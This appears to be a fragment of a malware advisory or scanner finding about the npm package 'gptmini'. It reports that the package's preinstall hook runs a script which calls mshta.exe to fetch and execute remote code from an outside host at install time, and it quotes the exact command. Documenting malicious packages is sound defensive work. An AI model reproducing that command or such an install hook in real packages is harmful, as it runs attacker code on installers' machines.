  "summary": "preinstall script executes remote HTA payload via mshta.exe",
  "details": "package.json declares scripts.preinstall=`node preinstall.js`. preinstall.js runs `exec('cmd /c \"mshta http://fixars.top\"')`, which invokes Windows mshta.exe to fetch and execute attacker-controlled HTML Application code from http://fixars.top over plain HTTP at install time. The fetch is unpinned, untrusted, and unrelated to any documented package purpose. Any Windows machine running `npm install gptmini` will auto-execute attacker-controlled code with the installer's privileges.",
